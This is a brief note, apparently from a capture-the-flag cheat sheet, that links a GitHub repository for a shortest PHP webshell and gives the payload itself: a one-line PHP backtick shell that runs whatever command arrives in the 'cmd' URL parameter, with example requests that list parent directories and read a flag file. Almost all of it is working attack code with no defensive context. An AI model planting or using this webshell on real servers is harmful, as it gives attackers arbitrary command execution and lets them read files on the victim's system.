https://github.com/Xib3rR4dAr/shortest-php-webshell/blob/master/0.php

- Need file upload php longer than 16 bytes
### Payload 
- ```<?=`$_GET[cmd]`;``` 
- ``` test.php?cmd=ls%20-a%20../../../../../../ ```
- ``` test.php?cmd=cat%20../../../../../../flag ```       
